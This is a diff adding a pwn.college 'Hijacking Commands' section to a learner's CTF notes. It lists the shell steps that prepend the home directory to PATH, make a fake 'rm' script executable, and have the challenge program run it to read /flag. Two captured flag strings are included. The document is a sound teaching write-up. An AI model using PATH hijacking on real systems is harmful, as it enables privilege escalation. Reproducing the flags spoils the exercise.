@@ -88,4 +88,38 @@ Congratulations! You properly set the flag and 'win' has launched!*
 >pwn.college{wVqOGJ2yk91l5kQNXC8LLSg-pTh.dZzNyUDLygjN0czW}
 ---
 
-# 
+# Hijacking Commands
+
+***Commands:***
+
+1) `hacker@path~hijacking-commands:~$ ls` *output: Desktop  f  not-the-flag  rm  the-flag*
+
+2) `hacker@path~hijacking-commands:~$ echo $PATH`
+
+3) `hacker@path~hijacking-commands:~$ PATH=/home/hacker:$PATH`
+
+4) `hacker@path~hijacking-commands:~$ echo $PATH`
+*output: /home/hacker:/run/challenge/bin:/run/workspace/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin*
+
+5) `hacker@path~hijacking-commands:~$ ls -l rm`
+*output: -rw-r--r-- 1 hacker hacker 29 Oct 19 19:27 rm*
+
+6) `hacker@path~hijacking-commands:~$ chmod a+x rm`
+
+7) `hacker@path~hijacking-commands:~$ ls -l rm`
+*output: -rwxr-xr-x 1 hacker hacker 29 Oct 19 19:27 rm*
+
+8) `hacker@path~hijacking-commands:~$ /challenge/run`
+
+***Flag:***
+
+>pwn.college{YoVr-wm6xi3XjaZ5AKleSNfbSWV.ddzNyUDLygjN0czW}
+
+***Observation:***
+
+1) `hacker@path~hijacking-commands:~$ echo /run/workspace/bin/cat /flag > rm`
+
+2) `hacker@path~hijacking-commands:~$ /challenge/run`
+*output: Trying to remove /flag...
+Found 'rm' command at /home/hacker/rm. Executing!
+/home/hacker/rm: line 1: /run/workspace/bin/cat: No such file or directory*
